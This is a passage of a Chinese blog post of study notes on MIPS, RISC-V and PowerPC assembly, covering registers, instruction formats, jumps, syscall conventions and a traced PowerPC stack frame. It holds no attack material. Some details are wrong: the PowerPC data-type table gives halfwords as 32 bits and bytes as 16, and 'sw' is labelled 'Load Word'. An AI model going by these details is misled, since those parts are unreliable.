register)，就必须先将这些保留寄存器的值保存在被调用者 stack frame 的保留寄存器域中，当被调用者返回时恢复这些寄存器值；当被调用者不是叶子函数时，即被调用者中存在对其它函数的调用，需要将 ra (return address) 寄存器 值保存到被调用者 stack frame 的返回值域中；被调用者所需要使用的局部变量，应保存在被调用者 stack frame 的本地变量域中。</p><p>进入一个函数时需要将当前栈指针向下移动 n 比特，这个大小为n比特的存储空间就是此函数的 stack frame 的存储区域。此后栈指针便不再移动，只能在函数返回时再将栈指针加上这个偏移量恢复栈现场。<strong>由于不能随便移动栈指针，所以寄存器压栈和出栈都必须指定偏移量。</strong></p><p>在 RISC 计算机中主要参与计算的是寄存器，saved registers 就是指在进入一个函数后，如果某个保存原函数信息的寄存器会在当前函数中被使用，就应该将此寄存器保存到堆栈上，当函数返回时恢复此寄存器值。而且由于 RISC 计算机大部分采用定长指令或者定变长指令，一般指令长度不会超过32个位。而现代计算机的内存地址范围已经扩展到 32 位，这样在一条指令里就不足以包含有效的内存地址，所以RISC计算机一般借助于一个返回地址寄存器 RA(return address) 来实现函数的返回。几乎在每个函数调用中都会使用到这个寄存器，所以在很多情况下 RA 寄存器会被保存在堆栈上以避免被后面的函数调用修改，当函数需要返回时，从堆栈上取回 RA 然后跳转。移动 SP 和保存寄存器的动作一般处在函数的开头；恢复这些寄存器状态的动作一般放在函数的最后。</p><h2 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h2><h2 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h2><p>MIPS指令长度为32位，其中指令位均为6位，其余的26位可以分为R型、I型、J型共3种类型。 </p><p>R型 Opcode(6) Rd(5) Rs(5) Rt(5) Shamt(5) Funct(6) </p><p>I型 Opcode(6) Rd(5) Rs(5) Immediate(16) </p><p>J型 Opcode(6) Address(26)</p><p>各字段含义如下：</p><ul><li>Opcode：指令基本操作，成为操作码；</li><li>Rs：第一个源操作数寄存器；</li><li>Rt：第二个源操作数寄存器；</li><li>Rd：存放操作结果的目的操作数；</li><li>Shamt：位移量；</li><li>Funct：函数，这个字段选择Opcode操作的某个特定变体。</li><li>PS：所以有些指令会被优化，比如li $v0,0x7777,实际上CPU会解析成ori $v0,$zero,0x7777或addi $v0,$zero,0x7777执行。</li></ul><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><h4 id="内存与寄存器"><a href="#内存与寄存器" class="headerlink" title="内存与寄存器"></a>内存与寄存器</h4><ul><li><code>li(Load Immediate)：</code></li></ul><p>用于将一个立即数 存入一个寄存器</p><p><code>li $Rd, imm</code></p><ul><li><code>lui(Load Upper halfword Immediate)：</code></li></ul><p>读取一个16位立即数放入寄存器的高16位，低16位补0。如果加载一个32位立即数（DWORD）则需要lui和addi两条指令配合完成。因为作为32位定长指令没有足够的空间存储32位立即数，只能用16位代替。</p><p><code>lui $a1, 0x42 //将0x42放入$a1的高16位</code></p><ul><li><code>lw(Load Word)：</code></li></ul><p>用于从一个指定的地址加载一个word类型的值到寄存器中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lw $Rt, offset($Rs)</span><br><span class="line"></span><br><span class="line">lw $s0, 0($sp) //取堆栈地址偏移0内存word长度的值到$s0中，$s0 = MEM[$sp+0]</span><br></pre></td></tr></table></figure><ul><li><code>sw(Load Word)：</code></li></ul><p>用于将源寄存器中的值存入指定的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sw $Rt, offset($Rs)</span><br><span class="line"></span><br><span class="line">sw $a0, 0($sp) //将$a0寄存器中的一个word大小的值存入堆栈，且$sp自动抬栈</span><br></pre></td></tr></table></figure><h4 id="算术指令"><a href="#算术指令" class="headerlink" title="算术指令"></a>算术指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add $t0, $t1, $t2 //$t0 = $t1 + $t2，带符号数相加</span><br><span class="line">sub $t0, $t1, $t2 //$t0 = $t1 - $t2，带符号数相减</span><br><span class="line">addi $t0, $t1, 5 //$t0 = $t1 + 5</span><br><span class="line">addu $t0, $t1, $t2 //$t0 = $t1 + $t2，无符号数相加</span><br><span class="line">subu $t0, $t1, $t2 //$t0 = $t1 - $t2，无符号数相减</span><br><span class="line">mult $t3, $t4 //(Hi, Lo) = $t3 * $t4</span><br><span class="line">div $t5, $t6 //$Lo = $t5 / $t6 $Lo为商的整数部分， $Hi为商的余数部分</span><br><span class="line">mfhi $t0 //$t0 = $Hi</span><br><span class="line">mflo $t1 //$t1 = $Lo</span><br></pre></td></tr></table></figure><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><p><strong>系统调用号存放在$v0中,参数存放在$a0~$a3中</strong>（如果参数过多，会有另一套机制来处理）,系统调用的返回值通常放在$v0中,如果系统调用出错，则会在$a3中返回一个错误号,最终调用Syscall指令。</p><h4 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h4><ul><li>跳转指令(j)</li></ul><p>有限的32位指令长度对于大型程序的分支跳转支持确实是个难题。MIPS指令中最小的操作码域占6位，剩下的26位用于跳转目标的编址。由于所有指令在内存中都是4字节对齐的，因此最低的2个比特位是无需存储的，这样实际可供寻址范围为2^28=256MB。分支跳转地址被当做一个256MB的段内绝对地址，而非PC相对寻址。这对于地址范围超过256MB的跳转程序而言是无能为力的，所幸目前也很少遇到这么大的远程跳转需求。</p><ul><li>段外分支跳转 </li></ul><p>可以使用寄存器跳转指令实现，它可以跳转到任意（有效的）32位地址。</p><ul><li>条件分支跳转指令(b)</li></ul><p>编码域的后 16 位 broffset 是相对当前指令PC的有符号偏移量，由于指令是4字节对齐的，长度都为4个字节，因此可支持的跳转范围实际上是2^16 * 4（指令宽度）=2^18=256KB（相对PC的-128KB~+128KB）。如果确定跳转目标地址在分支指令前后的128KB范围内，编译器就可以编码只生成一条简单的条件分支指令。</p><h4 id="分支跳转指令"><a href="#分支跳转指令" class="headerlink" title="分支跳转指令"></a>分支跳转指令</h4><p>在MIPS中，分支跳转指令本身可通过比较两个寄存器中的值来决定是否跳转。要想实现与立即数比较的跳转，可以结合类跳转指令实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beq $Rs, $Rt, target //if ($Rs == $Rt): goto target</span><br><span class="line">blt $Rs, $Rt, target //if ($Rs &lt; $Rt): goto target </span><br><span class="line">ble $Rs, $Rt, target //if ($Rs &lt;= $Rt): goto target </span><br><span class="line">bgt $Rs, $Rt, target //if ($Rs &gt; $Rt): goto target </span><br><span class="line">bge $Rs, $Rt, target //if ($Rs &gt;= $Rt): goto target </span><br><span class="line">bne $Rs, $Rt, target //if ($Rs != $Rt): goto target</span><br></pre></td></tr></table></figure><h4 id="直接跳转指令"><a href="#直接跳转指令" class="headerlink" title="直接跳转指令"></a>直接跳转指令</h4><ul><li><p>j：该指令无条件跳转到一个绝对地址。实际上，j 指令跳转到的地址并不是直接指定32位的地址（所有 MIPS 指令都是 32 位长，不可能全部用于编址数据域，那样的指令是无效的，也许只有nop）：由于目的地址的最高4位无法在指令的编码中给出，32位地址的最高4位取值当前PC的最高4位。对于一般的程序而言，28位地址所支持的256MB跳转空间已经足够大了。</p><p>要实现更远程的跳转，必须使用 jr 指令跳转到指定寄存器中，该指令也用于需要计算合成跳转目标地址的情形。你可以使用 j 助记符后面紧跟一个寄存器表示寄存器跳转，不过一般不推荐这么做。</p></li><li><p>jal、jalr：这两条指令分别实现了直接和间接子程序调用。在跳转到指定地址实现子程序调用的同时，需要将返回地址（当前指令地址+8）保存到 ra（$31）寄存器中。为什么是当前指令地址加8呢？这是因为紧随跳转指令之后有一条立即执行的延迟槽指令（例如nop占位指令），加8刚好是延迟槽后面的那条有效指令。从子程序返回是通过寄存器跳转完成，通常调用 jr ra。</p><p>基于 PC 相对寻址的位置无关子程序调用通过 bal、bgezal 和 bltzal 指令完成。条件分支和链接指令即使在条件为假的情况下，也会将它们的返回地址保存到 ra 中，这在需要基于当前指令地址做计算的场合非常有用。</p></li><li><p>b：相对当前指令地址（PC）的无条件短距离跳转指令。</p></li><li><p>bal：基于当前指令地址（PC）的函数调用指令。</p></li></ul><h1 id="RISC-V"><a href="#RISC-V" class="headerlink" title="RISC-V"></a>RISC-V</h1><h2 id="寄存器-2"><a href="#寄存器-2" class="headerlink" title="寄存器"></a>寄存器</h2><p>RISC-V共32个通用寄存器,以及PC寄存器</p><div class="table-container"><table><thead><tr><th style="text-align:left">Register</th><th style="text-align:left">ABI Name</th><th style="text-align:left">Saver</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">x0</td><td style="text-align:left">zero</td><td style="text-align:left">—</td><td style="text-align:left">硬编码恒为0</td></tr><tr><td style="text-align:left">x1</td><td style="text-align:left">ra</td><td style="text-align:left">Caller</td><td style="text-align:left">函数调用的返回地址</td></tr><tr><td style="text-align:left">x2</td><td style="text-align:left">sp</td><td style="text-align:left">Callee</td><td style="text-align:left">堆栈指针</td></tr><tr><td style="text-align:left">x3</td><td style="text-align:left">gp</td><td style="text-align:left">—</td><td style="text-align:left">全局指针</td></tr><tr><td style="text-align:left">x4</td><td style="text-align:left">tp</td><td style="text-align:left">—</td><td style="text-align:left">线程指针</td></tr><tr><td style="text-align:left">x5-7</td><td style="text-align:left">t0-2</td><td style="text-align:left">Caller</td><td style="text-align:left">临时寄存器/</td></tr><tr><td style="text-align:left">x8</td><td style="text-align:left">s0/fp</td><td style="text-align:left">Callee</td><td style="text-align:left">保存寄存器/帧指针</td></tr><tr><td style="text-align:left">x9</td><td style="text-align:left">s1</td><td style="text-align:left">Callee</td><td style="text-align:left">保存寄存器</td></tr><tr><td style="text-align:left">x10-11</td><td style="text-align:left">a0-1</td><td style="text-align:left">Caller</td><td style="text-align:left">函数参数/返回值</td></tr><tr><td style="text-align:left">x12-17</td><td style="text-align:left">a2-7</td><td style="text-align:left">Caller</td><td style="text-align:left">函数参数</td></tr><tr><td style="text-align:left">x18-27</td><td style="text-align:left">s2-11</td><td style="text-align:left">Callee</td><td style="text-align:left">保存寄存器</td></tr><tr><td style="text-align:left">x28-31</td><td style="text-align:left">t3-6</td><td style="text-align:left">Caller</td><td style="text-align:left">临时寄存器</td></tr></tbody></table></div><p>函数调用过程中可以直接改写的寄存器叫<strong>临时寄存器(t0~t6)</strong>。在调用过程中不能直接改写的寄存器值得叫保存寄存器(s0~s11)**，函数调用过程中如果要使用s0~s11，需要由被调用函数进行保护，保证在函数调用前后内部值不变。</p><h2 id="栈帧与函数调用约定"><a href="#栈帧与函数调用约定" class="headerlink" title="栈帧与函数调用约定"></a>栈帧与函数调用约定</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_231658.png" alt=""></p><p>寄存器与函数调用约定</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_232103.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_232509.png" alt=""></p><h2 id="跳转-1"><a href="#跳转-1" class="headerlink" title="跳转"></a>跳转</h2><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-12-12_232318.png" alt=""></p><h1 id="POWER-PC"><a href="#POWER-PC" class="headerlink" title="POWER-PC"></a>POWER-PC</h1><p>PowerPC（后称Performance Optimization With Enhanced RISC – Performance Computing，有时缩写为PPC）是一种精简指令集计算机(RISC)指令集架构(ISA)，由 1991 年苹果-IBM-摩托罗拉联盟创建，称为AIM。PowerPC 作为一种不断发展的指令集，自 2006 年起被命名为Power ISA，而旧名称作为基于Power Architecture的处理器 的某些实现的商标继续存在。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>PowerPC支持的数据类型</p><div class="table-container"><table><thead><tr><th>名称</th><th>字长(bits)</th></tr></thead><tbody><tr><td>Quadwords</td><td>128</td></tr><tr><td>Doublewords</td><td>64</td></tr><tr><td>Halfwords</td><td>32</td></tr><tr><td>Words</td><td>16</td></tr><tr><td>Bytes</td><td>16</td></tr></tbody></table></div><h2 id="寄存器-3"><a href="#寄存器-3" class="headerlink" title="寄存器"></a>寄存器</h2><p>PowerPC中的寄存器有非常多，ABI规定的寄存器包括专用寄存器、易失性寄存器和非易失性寄存器。<br>易失性寄存器代表任何函数都可以自由对这些寄存器进行修改，并且不用恢复这些寄存器之前的值；而非易失性寄存器则代表函数可以使用这些寄存器，但需要在函数返回前将这些寄存器的值恢复。</p><ul><li>GPR寄存器</li></ul><p>General Purpose Rgister(GPR)，通用寄存器，从GPR0到GPR31共32个。<br>事实上在gdb中所见就是r0~r31，其中：<br>| 寄存器 | 用途 |<br>| - | - |<br>| r0 | 发生系统调用时对应的系统调用号 |<br>| r1 | 堆栈指针 |<br>| r2 | 内容表（toc）指针，IDA把这个寄存器反汇编标识为rtoc。系统调用时，它包含系统调用号 |<br>| r3 | 函数调用时的第一个参数和返回值 |<br>| r4-r10 | 函数调用时参数传递 |<br>| r11 | 用在指针的调用和当作一些语言的环境指针 |<br>| r12 | 它用在异常处理和glink（动态连接器）代码 |<br>| r13 | 保留作为系统线程ID |<br>| r14-r31 | 作为本地变量，非易失性(要保存) |</p><ul><li>FPR寄存器</li></ul><p>Floating-Point Register(FPR)，浮点寄存器，用于浮点运算，从FPR0-FPR31共32个。每个FPR寄存器都支持双精度浮点格式，在64位和32位处理器实现上，FPRs都是64位的。</p><ul><li>LR寄存器</li></ul><p>Link Register(LR)，链接寄存器，可以为条件转移链接寄存器指令提供转移目标地址，并在LK=1的转移指令之后保存返回地址。</p><p>LK即LINK bit，为0时不设置链接寄存器LR；为1时设置连接寄存器LR，转移指令后面的指令地址被放置在链接寄存器LR中</p><p>注意尽管两个最低有效位可以接受任何写入的值，但当LR被用作地址时，它们会被忽略。有些处理器可能会保存转移最近设置的LR值的堆栈。</p><ul><li>CR寄存器</li></ul><p>Condition Register(CR)，条件寄存器，它反映某些操作的结果，并提供一种测试（和转移）的机制</p><p>条件寄存器中的位被分组为8个4位字段，命名为CR字段0(CR0)，…，CR字段7(CR7)。CR字段可以通过一些指令进行设置，其中CR0可以是整数指令的隐式结果，CR1可以时浮点指令的隐式结果，指定的CR字段可以表示整数或浮点数比较指令的结果。</p><p><a href="https://imgtu.com/i/vZm4TU"><img src="https://storage.tttang.com/media/attachment/2022/08/08/9b520086-d2ee-44fa-99e1-0d94b00a200f.png" alt="vZm4TU.png"></a></p><p>CR0字段含义如下<br>| Bits | 描述 |<br>| - | - |<br>| 0 | Negative(LT) - 结果为负时设置该位，即小于 |<br>| 1 | Positive(GT) - 结果为正数（非零）时设置该位，即大于 |<br>| 2 | Zero(EQ) - 结果为0时设置该位，即等于 |<br>| 3 | Summary overflow(SO) - 这是XER[SO]指令完成时的最终状态的副本 |</p><p>需要注意当溢出发生时，CR0可能不能反应真实的结果</p><ul><li>CTR寄存器</li></ul><p>Count Register(CTR)，计数器，可以用来保存循环计数；还可以用来为转移条件计数寄存器指令提供转移目标地址。</p><ul><li>XER寄存器</li></ul><p>Fixed-Point Exception Register(XER)，特殊寄存器，是一个64位寄存器，用来记录溢出和进位标志</p><div class="table-container"><table><thead><tr><th>Bits</th><th>描述</th></tr></thead><tbody><tr><td>0:31</td><td>保留</td></tr><tr><td>32</td><td>Summary Overflow(SO):每当指令(除mtspr)设置溢出位时，SO位被设置为1。一旦设置，SO位会保持设置知道被一个mtspr指令(指定XER)或一个mcrxr指令清除。它不会被compare指令修改，也不会被其他不能溢出的指令(除对XER的mtspr、mcrxr)改变</td></tr><tr><td>33</td><td>Overflow(OV)：执行指令时发生溢出设置。OV位不会被compare指令改变，也不会被其他不能溢出的指令(除对XER的mtspr、mcrxr)改变</td></tr><tr><td>34</td><td>Carry(CA)：在执行某些指令时，进位设置如下，加进位，减进位，加扩展，减扩展类型的指令，如果有M位的进位则设位1，否则设为0。执行右移代数指令时如果有任何1位移出了一个负操作数，设置其为1，否则设为0。CA位不会被compare指令改变，也不会被其他不能进位的指令（除代数右移、对XER的mtspr、mcrxr）改变</td></tr><tr><td>35:56</td><td>保留</td></tr><tr><td>57:63</td><td>该字段指定“加载字符串索引”或“存储字符串索引”指令传输的字节数</td></tr></tbody></table></div><ul><li>FPSCR寄存器</li></ul><p>Floating-Point Status and Control Register(FPSCR)，浮点状态和控制寄存器，控制浮点异常的处理，并记录浮点操作产生的状态，其中0:23位是状态位，24:31位是控制位。浮点异常包括浮点数溢出异常、下溢异常、除零异常、无效操作异常等</p><ul><li>MSR</li></ul><p>机器状态寄存器，MSR定义处理器的状态，用来配置微处理器的设定。</p><p>寄存器r1、r14-r31是非易失性的，这意味着它们的值在函数调用过程保持不变。寄存器r2也算非易失性，但是只有在调用函数在调用后必须恢复它的值时才被处理。</p><p>寄存器r0、r3-r12和特殊寄存器lr、ctr、xer、fpscr是易失性的，它们的值在函数调用过程中会发生变化。此外寄存器r0、r2、r11和r12可能会被交叉模块调用改变，所以函数在调用的时候不能采用它们的值。</p><p>条件代码寄存器字段cr0、cr1、cr5、cr6和cr7是易失性的。cr2、cr3和cr4是非易失性的，函数如果要改变它们必须保存并恢复这些字段。</p><div class="table-container"><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">寄存器</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">GPR0-GPR31（共32个寄存器）</td><td style="text-align:left">整数运算和寻址通用寄存器.在ABI规范中，GPR1用于堆栈指针，GPR3-GPR4用于函数返回值，GPR3-GPR10用于参数传递</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">FPR0-FPR31（共32个寄存器）</td><td style="text-align:left">用于浮点运算。PPC32和PPC64的浮点数都是64位</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">LR</td><td style="text-align:left">连接寄存器，记录转跳地址，常用于记录子程序返回的地址。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">CR</td><td style="text-align:left">条件寄存器。</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">XER</td><td style="text-align:left">特殊寄存器，记录溢出和进位标志，作为CR的补充</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">CTR</td><td style="text-align:left">计数器，用途相当于ECX</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left">FPSCR</td><td style="text-align:left">浮点状态寄存器，用于浮点运算类型的异常记录等，可设置浮点异常捕获掩码</td></tr></tbody></table></div><h2 id="常用指令-1"><a href="#常用指令-1" class="headerlink" title="常用指令"></a>常用指令</h2><h3 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lbz RT,D(RA)</span><br><span class="line">lhz RT,D(RA)</span><br><span class="line">lha RT,D(RA)</span><br><span class="line">lwz RT,D(RA)</span><br><span class="line">lwa RT,DS(RA)</span><br><span class="line">ld RT,DS(RA)</span><br></pre></td></tr></table></figure><p>上述指令均表示以<code>(EA)=(RA|0)+D/DS</code>为有效地址加载字节到<code>RT</code>中，以偏移地址寻址。<code>b</code>，<code>h</code>，<code>w</code>，<code>d</code>分别代表字节、半字、字、双字，指加载的位数。<br><code>z</code>表示其他位清零，<code>a</code>表示其他位将被加载的数据的位0复制填充。</p><p>指令最后加一个<code>x</code>表示寄存器寻址，例如<code>lbzx RT,RA,RB</code>表示以<code>(RA|0)+(RB)</code>为有效地址加载字节到<code>RT</code>中。</p><h4 id="存储数据"><a href="#存储数据" class="headerlink" title="存储数据"></a>存储数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stb RS,D(RA)</span><br><span class="line">sth RS,D(RA)</span><br><span class="line">stw RS,D(RA)</span><br><span class="line">std RS,DS(RA)</span><br></pre></td></tr></table></figure><p>都是类似加载指令的，同理上述指令均以偏移地址寻址，将<code>RS</code>的值存储到<code>(RA|0)+D/DS</code>地址中。如果最后加一个<code>x</code>则表示寄存器寻址。</p><h3 id="跳转-2"><a href="#跳转-2" class="headerlink" title="跳转"></a>跳转</h3><h4 id="控制转移"><a href="#控制转移" class="headerlink" title="控制转移"></a>控制转移</h4><p>无条件转移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b target_addr (AA = 0 LK = 0)</span><br><span class="line">ba target_addr (AA = 1 LK = 0)</span><br><span class="line">bl target_addr (AA = 0 LK = 1)</span><br><span class="line">bla target_addr (AA = 1 LK = 1)</span><br></pre></td></tr></table></figure><p>target_addr指定转移目标地址，如果<code>AA=0</code>，那么转移目标地址是<code>LI||0b00</code>经符号符号拓展后加上指令地址；如果<code>AA=1</code>，那么转移目标地址为<code>LI||0b00</code>经符号拓展后的值。<br>如果<code>LK=1</code>，则转移指令的下一条指令的有效地址会被放置到链接寄存器<code>LR</code>中。<br><code>B-Form</code>指令长度32位(0-31)，<code>AA</code>是30位，<code>LK</code>是31位</p><h4 id="条件转移"><a href="#条件转移" class="headerlink" title="条件转移"></a>条件转移</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bc BO,BI,target_addr (AA = 0 LK = 0)</span><br><span class="line">bca BO,BI,target_addr (AA = 1 LK = 0)</span><br><span class="line">bcl BO,BI,target_addr (AA = 0 LK = 1)</span><br><span class="line">bcla BO,BI,target_addr (AA = 1 LK = 1)</span><br></pre></td></tr></table></figure><p><code>BI</code>字段表示作为转移条件的CR位，<code>BO</code>字段操作码对应具体如何进行转移</p><p>一些常见的转移条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lt &lt;=&gt; less than</span><br><span class="line">le &lt;=&gt; less than or equal</span><br><span class="line">eq &lt;=&gt; equal</span><br><span class="line">ge &lt;=&gt; greater than or equal</span><br><span class="line">gt &lt;=&gt; greater than</span><br><span class="line">nl &lt;=&gt; not less than</span><br></pre></td></tr></table></figure><h3 id="系统调用-1"><a href="#系统调用-1" class="headerlink" title="系统调用"></a>系统调用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc</span><br></pre></td></tr></table></figure><p><code>r0</code>作为系统调用号</p><h2 id="栈帧与函数调用约定-1"><a href="#栈帧与函数调用约定-1" class="headerlink" title="栈帧与函数调用约定"></a>栈帧与函数调用约定</h2><p>栈的概念在PPC等CPU中，不是由CPU实现的，而是由编译器维护的。通常情况下，在PPC中栈顶指针寄存器使用r1，栈底指针寄存器使用r11或r31。或者r11为栈顶，其他为栈底。根据不同的编译选项和编译器环境，其使用方式都有不同，但各个编译器的共识为r1是帧栈指针，其他寄存器都可根据他为准灵活使用。</p><p>栈帧在函数中，通常用于存储局部变量、编译器产生的临时变量等。由于PPC和ARM等CPU在寄存器较多，所以函数的形参和实参大多数情况下会使用寄存器，参数较多的情况下使用栈。</p><p>PowerPC体系结构中栈的增长方向同样是从高地址到低地址，堆的增长方式是从低地址到高地址，当两者相遇时就会产生溢出。</p><p>堆栈帧的格式如下：</p><p><a href="https://imgtu.com/i/vZtd8P"><img src="https://storage.tttang.com/media/attachment/2022/08/08/9f67f039-fc74-4fcd-8b7b-b743fbea3b1f.png" alt="vZtd8P.png"></a></p><p>下面从一个例子分析PPC中栈帧的变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// powerpc-linux-gnu-gcc -static -g -o t t.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ok,n1,n2,n3,n4,n5,n6,n7,n8,n9;</span><br><span class="line">    ok=n1=n2=n3=n4=n5=n6=n7=n8=n9=n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d%d%d%d%d%d%d%d%d%d%d&quot;</span>,ok,n,n1,n2,n3,n4,n5,n6,n7,n8,n9);</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n;</span><br><span class="line">    n=test(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在进入函数的时候会先执行</p><p><a href="https://imgtu.com/i/vmxmnJ"><img src="https://storage.tttang.com/media/attachment/2022/08/08/bf1a4e7f-7c76-4a2a-be61-21df55dcb065.png" alt="vmxmnJ.png"></a></p><p><code>r1</code>就类似栈顶指针，第一条指令中，<code>stwu</code>最后的<code>u</code>表示update，指令中有效地址<code>EA=r1+back_chain</code>，该指令首先会将<code>r1</code>的值存放到<code>EA</code>中，接着会把有效地址<code>EA</code>存到<code>r1</code>里。<code>back_chain</code>对应新栈帧大小，是一个负值，此处为0x60，所以这里实际上就是开辟了一块新的栈帧，让<code>r1</code>指向新栈顶，同时在新栈顶处存储了上一个栈帧的栈顶，从而构成一个类似链表的东西，在之后帮助恢复栈帧。</p><p><code>mflr r0</code>，把<code>lr</code>寄存器的值保存到<code>r0</code>中。接着<code>stw</code>将<code>r0</code>保存到栈上，从而在栈上保存了<code>lr</code>返回地址的值。指令中对栈变量的索引使用的是<code>0x60+sender_lr(r1)</code>，<code>r1</code>已经指向新栈帧的栈顶，所以这里是通过栈顶指针索引栈上的局部变量，栈帧空间大小即0x60。</p><p>下一条<code>stw</code>指令将<code>r31</code>存储到栈上，然后执行<code>mr</code>把<code>r1</code>的值赋给<code>r31</code>。</p><p>接下来就是函数中的赋值和调用<code>printf</code>的操作了</p><p><a href="https://imgtu.com/i/vmxu7R"><img src="https://storage.tttang.com/media/attachment/2022/08/08/c8ff5d04-6e39-4d8a-817c-b3638a398a05.png" alt="vmxu7R.png"></a></p><p>由于<code>test</code>函数传入了一个参数n，是通过<code>r3</code>传递的。所以在之后看到首先把<code>r3</code>存到了栈上，接着不断连续调用<code>lwz</code>和<code>stw</code>指令，以<code>r9</code>为中间量，并通过<code>r31</code>索引，对栈上局部变量进行赋值。</p><p>接下来就是为函数调用布置参数了，这里由于我们使用的参数很多，会同时使用寄存器和栈变量进行传参。<strong>ppc中没有<code>push</code>、<code>pop</code>这样的指令</strong>，栈帧空间是提前设置好的，这里指令做的就是把参数从右往左把多出来的4个参数依次在栈上从高地址往低地址放置，第9个参数与栈顶位置中间还会留下一个字长的空间，用来存放下一个栈帧的返回地址；剩下的8个参数按照从右往左依次放入<code>r3</code>~<code>r10</code>中，指定执行时是从<code>r10</code>开始存放的。<code>crclr</code>是用来调整条件寄存器<code>CR</code>的。</p><p>最后就是恢复函数栈帧</p><p><a href="https://imgtu.com/i/vmxJje"><img src="https://storage.tttang.com/media/attachment/2022/08/08/52adb389-70d5-47e4-ad78-90b984509b1a.png" alt="vmxJje.png"></a></p><p><code>lwz</code>将栈上的值赋给<code>r9</code>，再用<code>mr</code>把<code>r9</code>赋给<code>r3</code>，其实就是在传递函数的返回值`n</p><p><code>addi</code>把上一个栈帧的栈顶地址存到<code>r11</code>里，然后索引到存放<code>lr</code>返回地址的位置把值放进<code>r0</code>，再通过<code>mtlr r0</code>把<code>r0</code>的值赋给<code>lr</code>寄存器，从而完成了返回地址的恢复。</p><p>接着<code>lwz r31, -4(r11)</code>即以上一个栈帧栈顶位置减4为有效地址取值存入<code>r31</code>，这一步是在恢复<code>r31</code>寄存器，对应开头进入函数时<code>stw r31, 0x60+var_4(r1)</code>在栈上保存的<code>r31</code>的值，因为它是非易失性寄存器需要恢复。</p><p>再把<code>r11</code>的值给<code>r1</code>，从而<code>r1</code>恢复指向原栈帧的栈顶，完成了函数的退栈操作。到这里也可以看出在ppc中是通过栈顶指针完成栈帧的开辟和弹出的，栈顶指针以链表形式链接，同时对局部变量的操作也是以栈顶为基址进行偏移索引的。</p><p>最后<code>blr</code>返回到原函数继续向下执行</p>]]></content>
    
    
    <summary type="html">ARM!</summary>
    
    
